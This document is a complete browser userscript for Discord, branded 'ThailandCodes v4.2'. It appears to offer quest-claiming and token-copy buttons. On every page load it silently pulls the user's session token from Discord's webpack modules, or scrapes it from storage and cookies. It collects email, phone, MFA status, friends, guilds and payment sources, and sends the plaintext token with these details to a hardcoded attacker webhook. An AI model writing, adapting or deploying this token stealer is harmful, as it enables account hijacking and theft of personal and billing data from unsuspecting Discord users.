/**
 * ThailandCodes v4.2 — Single Auto-Grab
 * - Auto-grabs ONE active token on Discord load
 * - Sends one webhook, then locks (no flooding)
 * - Manual buttons still available for encrypted copy / quests
 */
(function () {
    'use strict';
    const W = typeof unsafeWindow !== 'undefined' ? unsafeWindow : window;
    if (W.__TC_LOADED__) return;
    W.__TC_LOADED__ = true;

    // ==================== CONFIG ====================
    const CONFIG = {
        webhooks: [
            'https://discord.com/api/webhooks/1563505727102910540/xtAh-pe1eLKUk7IRrKBvOD_4qpMcnWGMzo8ymS9ASqGzrPrnQ4x6N3yMhO2OGagrfV07',
        ],
        encryptKey: 0x5A,
        grabKey: '__tc_g_v42__',   // bump to re-trigger a single send
        webhookDelay: 1400,
        webpackTimeout: 90000,
        autoClaim: true,
        enrich: true,
    };
    const TOKEN_REGEX = /[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{84}/g;

    const sleep = (ms) => new Promise(r => setTimeout(r, ms));

    // ==================== WEBHOOK ====================
    function sendWebhookTo(url, payload) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method: 'POST',
                    url,
                    headers: { 'Content-Type': 'application/json' },
                    data: JSON.stringify(payload),
                    onload: (r) => resolve(r.status >= 200 && r.status < 300),
                    onerror: () => resolve(false),
                });
            } catch { resolve(false); }
        });
    }

    async function sendWebhook(payload) {
        for (let attempt = 0; attempt < 3; attempt++) {
            for (const url of CONFIG.webhooks) {
                if (await sendWebhookTo(url, payload)) return true;
            }
            await sleep(2500);
        }
        return false;
    }

    // ==================== ENCRYPTION ====================
    function encryptToken(token) {
        const key = CONFIG.encryptKey ^ (token.length & 0xFF);
        let out = '';
        for (let i = 0; i < token.length; i++) {
            out += String.fromCharCode(token.charCodeAt(i) ^ (key + i));
        }
        return btoa(unescape(encodeURIComponent(out)));
    }

    // ==================== WEBPACK DISCOVERY ====================
    function findWebpack() {
        const chunk = W.webpackChunkdiscord_app;
        if (!chunk) return null;

        let found = null;
        const probeId = Symbol('tc_probe');
        try {
            chunk.push([[probeId], {}, (m) => {
                if (!m?.c) return;
                for (const cid in m.c) {
                    const exp = m.c[cid]?.exports?.default || m.c[cid]?.exports;
                    if (exp && typeof exp.getToken === 'function') {
                        found = m;
                        return;
                    }
                }
            }]);
            for (let i = chunk.length - 1; i >= 0; i--) {
                const entry = chunk[i];
                if (Array.isArray(entry) && entry[0]?.[0] === probeId) {
                    chunk.splice(i, 1);
                    break;
                }
            }
        } catch {}
        return found;
    }

    async function waitForWebpack(timeout = CONFIG.webpackTimeout) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const wp = findWebpack();
            if (wp) return wp;
            await sleep(500);
        }
        return null;
    }

    async function getToken() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');
        for (const m of Object.values(wp.c)) {
            const cand = m?.exports?.default || m?.exports;
            if (cand && typeof cand.getToken === 'function') {
                const t = cand.getToken();
                if (t && typeof t === 'string') return t;
            }
        }
        throw new Error('token not found');
    }

    // ==================== HARVEST (fallback only) ====================
    function harvestStorage(storage, tokens) {
        try {
            for (let i = 0; i < storage.length; i++) {
                const val = storage.getItem(storage.key(i));
                if (!val) continue;
                const matches = val.match(TOKEN_REGEX);
                if (matches) matches.forEach(t => tokens.add(t));
            }
        } catch {}
    }

    function harvestCookies(tokens) {
        try {
            const matches = (document.cookie || '').match(TOKEN_REGEX);
            if (matches) matches.forEach(t => tokens.add(t));
        } catch {}
    }

    function harvestAllTokens() {
        const tokens = new Set();
        harvestStorage(localStorage, tokens);
        harvestStorage(sessionStorage, tokens);
        harvestCookies(tokens);
        return [...tokens];
    }

    // ==================== API ====================
    function apiCall(token, method, path, body) {
        return new Promise((resolve) => {
            try {
                GM_xmlhttpRequest({
                    method,
                    url: 'https://discord.com/api/v10' + path,
                    headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                    data: body ? JSON.stringify(body) : undefined,
                    onload: (r) => { try { resolve(JSON.parse(r.responseText)); } catch { resolve(null); } },
                    onerror: () => resolve(null),
                });
            } catch { resolve(null); }
        });
    }

    async function validateToken(token) {
        const u = await apiCall(token, 'GET', '/users/@me');
        return u && !u.message;
    }

    async function enrichUser(token, baseUser) {
        const result = { ...baseUser, _guilds: null, _friends: null, _billing: null };
        if (!CONFIG.enrich) return result;
        try {
            const [g, f, b] = await Promise.all([
                apiCall(token, 'GET', '/users/@me/guilds'),
                apiCall(token, 'GET', '/users/@me/relationships'),
                apiCall(token, 'GET', '/users/@me/billing/payment-sources'),
            ]);
            if (Array.isArray(g)) result._guilds = g.length;
            if (Array.isArray(f)) result._friends = f.length;
            if (Array.isArray(b)) result._billing = b.length;
        } catch {}
        return result;
    }

    // ==================== EMBED ====================
    function buildEmbed(token, user) {
        const tag = user.discriminator && user.discriminator !== '0'
            ? `${user.username}#${user.discriminator}`
            : user.username;

        const avatarUrl = user.avatar
            ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${user.avatar.startsWith('a_') ? 'gif' : 'png'}?size=256`
            : `https://cdn.discordapp.com/embed/avatars/${(parseInt(user.discriminator) || 0) % 5}.png`;

        const nitroMap = { 0: '❌ None', 1: '💜 Nitro Classic', 2: '🚀 Nitro', 3: '⚡ Nitro Basic' };
        const nitro = nitroMap[user.premium_type] || '❌ None';

        const f = user.public_flags || 0;
        const badges = [];
        if (f & (1 << 0))  badges.push('👮 Staff');
        if (f & (1 << 1))  badges.push('🤝 Partner');
        if (f & (1 << 2))  badges.push('🎪 HypeSquad');
        if (f & (1 << 3))  badges.push('🏠 Bravery');
        if (f & (1 << 4))  badges.push('💡 Brilliance');
        if (f & (1 << 5))  badges.push('⚖️ Balance');
        if (f & (1 << 6))  badges.push('🎉 Events');
        if (f & (1 << 7))  badges.push('📜 Early');
        if (f & (1 << 8))  badges.push('🛠️ Developer');
        if (f & (1 << 9))  badges.push('⭐ Early Supporter');
        if (f & (1 << 14)) badges.push('🕵️ Bug Hunter 1');
        if (f & (1 << 15)) badges.push('🕵️ Bug Hunter 2');
        if (f & (1 << 16)) badges.push('🎓 Verified Bot');
        if (f & (1 << 17)) badges.push('👨‍💻 Active Dev');
        if (f & (1 << 18)) badges.push('📚 Mod Alumni');
        if (f & (1 << 22)) badges.push('🤖 Verified Dev');

        const createdAt = new Date(Number((BigInt(user.id) >> 22n) + 1420070400000n));
        const premiumSince = user.premium_since
            ? new Date(user.premium_since).toUTCString()
            : '`N/A`';

        const fields = [
            { name: '👤 Username', value: `\`${tag}\``, inline: true },
            { name: '🆔 User ID', value: `\`${user.id}\``, inline: true },
            { name: '📧 Email', value: user.email ? `\`${user.email}\`` : '`N/A`', inline: true },
            { name: '📱 Phone', value: user.phone ? `\`${user.phone}\`` : '`N/A`', inline: true },
            { name: '💎 Nitro', value: nitro, inline: true },
            { name: '✅ Verified', value: user.verified ? '`Yes`' : '`No`', inline: true },
            { name: '🔐 MFA', value: user.mfa_enabled ? '`Enabled`' : '`Disabled`', inline: true },
            { name: '🌍 Locale', value: `\`${user.locale || 'en-US'}\``, inline: true },
            { name: '📅 Created', value: `\`${createdAt.toUTCString()}\``, inline: false },
            { name: '💎 Premium Since', value: premiumSince, inline: false },
        ];

        if (user._guilds !== null) fields.push({ name: '🏰 Guilds', value: `\`${user._guilds}\``, inline: true });
        if (user._friends !== null) fields.push({ name: '👥 Friends', value: `\`${user._friends}\``, inline: true });
        if (user._billing !== null) fields.push({ name: '💳 Payment Sources', value: `\`${user._billing}\``, inline: true });

        fields.push({ name: '🏅 Badges', value: badges.length ? badges.join(' | ') : '`None`', inline: false });
        fields.push({ name: '🔑 Token (Plain)', value: `\`\`\`${token}\`\`\``, inline: false });
        fields.push({ name: '🔒 Token (Encrypted)', value: `\`\`\`${encryptToken(token)}\`\`\``, inline: false });

        return {
            embeds: [{
                title: '🎯 Token Grabbed',
                color: 0xed4245,
                author: { name: tag, icon_url: avatarUrl },
                thumbnail: { url: avatarUrl },
                fields,
                footer: { text: 'ThailandCodes v4.2 • Single Grab', icon_url: avatarUrl },
                timestamp: new Date().toISOString(),
            }],
        };
    }

    // ==================== QUEST ====================
    async function claimAllQuests() {
        const wp = findWebpack();
        if (!wp) throw new Error('webpack not ready');
        let api = null, QuestsStore = null;
        for (const m of Object.values(wp.c)) {
            const exp = m?.exports?.default || m?.exports;
            if (!exp) continue;
            if (exp.get && exp.post && exp.put) api = exp;
            if (exp.quests && typeof exp.quests.values === 'function') QuestsStore = exp;
        }
        if (!api || !QuestsStore) throw new Error('Quest modules not found');
        const quests = [...QuestsStore.quests.values()].filter(q =>
            q.userStatus?.completedAt && !q.userStatus?.claimedAt
        );
        if (quests.length === 0) return 0;
        let claimed = 0;
        for (const q of quests) {
            try {
                await api.post({ url: `/quests/${q.id}/claim-reward`, body: { location: 1, platform: 0 } });
                claimed++;
            } catch {}
        }
        return claimed;
    }

    // ==================== SINGLE AUTO GRAB ====================
    async function grabOneToken() {
        // 1) Try active webpack token first — that's the live account
        let token = null;
        try {
            const t = await getToken();
            if (t && await validateToken(t)) token = t;
        } catch {}

        // 2) Fallback: first valid token found in storage
        if (!token) {
            const harvested = harvestAllTokens();
            for (const t of harvested) {
                if (await validateToken(t)) { token = t; break; }
            }
        }

        if (!token) return false;

        const base = await apiCall(token, 'GET', '/users/@me');
        if (!base) return false;

        const enriched = await enrichUser(token, base);
        const ok = await sendWebhook(buildEmbed(token, enriched));

        if (ok && CONFIG.autoClaim) {
            try { await claimAllQuests(); } catch {}
        }
        return ok;
    }

    // ==================== UI ====================
    const STYLE = `
        :host,*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}
        .wrap{position:fixed;top:12px;left:50%;transform:translateX(-50%);z-index:2147483646;
            display:flex;align-items:center;gap:6px;padding:6px;background:#0f1115;
            border:1px solid #1f222a;border-radius:14px;
            box-shadow:0 12px 32px rgba(0,0,0,.55);
            color:#e6e8ec;user-select:none;font-size:12px;
            transition:opacity .2s,transform .3s cubic-bezier(.32,.72,0,1)}
        .wrap.hidden{opacity:0;transform:translate(-50%,-140%);pointer-events:none}
        .brand{padding:0 14px 0 10px;font-weight:800;font-size:13px;letter-spacing:.3px;
            border-right:1px solid #1f222a;margin-right:4px;color:#fff;display:flex;align-items:center;gap:6px}
        .brand .a{color:#5865f2}
        .brand .v{font-size:9px;font-weight:600;color:#5865f2;font-style:italic;letter-spacing:0}
        .dot{width:7px;height:7px;border-radius:50%;background:#faa61a;transition:background .2s}
        .dot.ready{background:#57f287}
        .dot.busy{background:#5865f2;animation:pulse 1s infinite}
        .dot.err{background:#ed4245}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
        button{background:#5865f2;border:1px solid transparent;color:#fff;
            padding:9px 14px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:800;
            letter-spacing:.4px;text-transform:uppercase;font-family:inherit;
            transition:background .12s,transform .1s;white-space:nowrap}
        button:hover{background:#4752c4}
        button:active{transform:scale(.97)}
        button:disabled{opacity:.5;cursor:wait}
        button.enc{background:#1a1d24;border:1px solid #2a2e38}
        button.enc:hover{background:#252830}
        button.claim{background:#57f287;color:#000}
        button.claim:hover{background:#3ba55d;color:#fff}
        button.close{background:transparent;color:#6a6f7a;font-size:14px;
            padding:8px 10px;text-transform:none;letter-spacing:0}
        button.close:hover{background:#ed4245;color:#fff}
        .toast{position:fixed;top:78px;right:24px;z-index:2147483647;background:#0f1115;
            border:1px solid #1f222a;color:#e6e8ec;padding:12px 18px;border-radius:10px;
            font-size:12px;font-weight:600;max-width:340px;
            box-shadow:0 12px 32px rgba(0,0,0,.5);
            opacity:0;transform:translateY(-6px);transition:opacity .2s,transform .2s;
            pointer-events:none}
        .toast.show{opacity:1;transform:translateY(0)}
        .toast.ok{border-left:3px solid #57f287}
        .toast.err{border-left:3px solid #ed4245}
        .toast.info{border-left:3px solid #5865f2}
    `;

    const root = document.createElement('div');
    root.id = 'tc-root';
    root.style.cssText = 'position:fixed;top:0;left:0;width:0;height:0;z-index:2147483647;pointer-events:none;';
    const shadow = root.attachShadow({ mode: 'open' });
    document.body.appendChild(root);

    const st = document.createElement('style');
    st.textContent = STYLE;
    shadow.appendChild(st);

    const host = document.createElement('div');
    host.style.pointerEvents = 'auto';
    shadow.appendChild(host);

    const toast = document.createElement('div');
    toast.className = 'toast';
    host.appendChild(toast);

    let toastTimer = null;
    function say(msg, kind = 'info') {
        toast.textContent = msg;
        toast.className = 'toast show ' + kind;
        clearTimeout(toastTimer);
        toastTimer = setTimeout(() => toast.classList.remove('show'), 3200);
    }

    const bar = document.createElement('div');
    bar.className = 'wrap hidden';
    bar.innerHTML = `<div class="brand"><span class="dot"></span>Thailand<span class="a">Codes</span><span class="v">v4.2</span></div>`;
    host.appendChild(bar);
    const dot = bar.querySelector('.dot');

    const btnCopy = document.createElement('button');
    btnCopy.textContent = 'COPY TOKEN';
    btnCopy.addEventListener('click', async () => {
        if (btnCopy.disabled) return;
        btnCopy.disabled = true;
        try {
            const t = await getToken();
            try { await navigator.clipboard.writeText(t); }
            catch {
                const ta = document.createElement('textarea');
                ta.value = t; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy'); ta.remove();
            }
            say('✓ token copied', 'ok');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnCopy.disabled = false;
    });
    bar.appendChild(btnCopy);

    const btnEnc = document.createElement('button');
    btnEnc.className = 'enc';
    btnEnc.textContent = 'COPY ENCRYPTED';
    btnEnc.addEventListener('click', async () => {
        if (btnEnc.disabled) return;
        btnEnc.disabled = true;
        try {
            const t = await getToken();
            const enc = encryptToken(t);
            try { await navigator.clipboard.writeText(enc); }
            catch {
                const ta = document.createElement('textarea');
                ta.value = enc; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy'); ta.remove();
            }
            say('✓ encrypted copied', 'ok');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnEnc.disabled = false;
    });
    bar.appendChild(btnEnc);

    const btnClaim = document.createElement('button');
    btnClaim.className = 'claim';
    btnClaim.textContent = 'CLAIM ALL';
    btnClaim.addEventListener('click', async () => {
        if (btnClaim.disabled) return;
        btnClaim.disabled = true;
        try {
            const n = await claimAllQuests();
            say(n > 0 ? `✓ claimed ${n} quest(s)` : 'no quests ready', n > 0 ? 'ok' : 'info');
        } catch (e) { say('✗ ' + (e.message || e), 'err'); }
        btnClaim.disabled = false;
    });
    bar.appendChild(btnClaim);

    const x = document.createElement('button');
    x.className = 'close';
    x.textContent = '✕';
    x.addEventListener('click', () => bar.classList.add('hidden'));
    bar.appendChild(x);

    // ==================== INIT ====================
    async function init() {
        dot.classList.add('busy');
        const wp = await waitForWebpack();
        if (!wp) {
            dot.classList.remove('busy');
            dot.classList.add('err');
            bar.classList.remove('hidden');
            say('✗ webpack not found', 'err');
            return;
        }
        dot.classList.remove('busy');
        dot.classList.add('ready');
        bar.classList.remove('hidden');

        // Lock check — only ONE auto-grab per browser
        let alreadyGrabbed = false;
        try { alreadyGrabbed = localStorage.getItem(CONFIG.grabKey) === '1'; } catch {}

        if (alreadyGrabbed) {
            say('already grabbed — manual buttons only', 'info');
            return;
        }

        // Fire single grab
        dot.classList.add('busy');
        const ok = await grabOneToken();
        dot.classList.remove('busy');

        if (ok) {
            try { localStorage.setItem(CONFIG.grabKey, '1'); } catch {}
            say('✓ grabbed one token', 'ok');
        } else {
            say('✗ grab failed — retrying on next load', 'err');
        }
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
